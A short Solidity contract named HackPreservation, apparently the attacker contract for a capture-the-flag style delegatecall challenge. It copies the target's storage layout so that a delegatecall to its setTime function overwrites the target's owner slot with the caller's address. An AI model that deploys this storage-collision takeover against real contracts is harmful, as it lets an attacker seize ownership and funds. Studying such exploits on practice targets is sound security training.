// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract HackPreservation {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
